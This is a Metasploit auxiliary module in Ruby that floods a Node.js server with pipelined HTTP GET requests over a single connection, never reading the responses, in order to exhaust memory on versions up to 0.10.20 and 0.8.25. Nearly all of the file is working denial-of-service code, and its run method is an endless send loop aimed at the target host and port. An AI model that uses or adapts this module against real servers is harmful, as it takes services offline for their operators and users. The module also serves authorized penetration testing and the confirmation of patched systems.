##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Node.js Pipelined Requests Flood Denial of Service (DoS)',
      'Description'    => %q{
          Makes a large number of requests over the same connection, without reading responses.
          This causes Node.js to allocate resources and run out of memory.
          Affects version <= 0.10.20 and <= 0.8.25.
      },
      'Author'         =>
        [
          'Marek Majkowski (original discovery)',
          'Filippo Valsorda (Metasploit module) <filippo.valsorda[at]gmail.com>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://github.com/joyent/node/issues/6214']
        ],
      'DisclosureDate' => 'Oct 18 2013'))

    register_options(
      [
        Opt::RPORT(80),
      ],
      self.class)
  end

  def run
    print_status("#{rhost}:#{rport} - Sending requests...")

    req = "GET / HTTP/1.1\r\n\r\n"

    connect
    loop do
      sock.put(req)
    end
  end
end
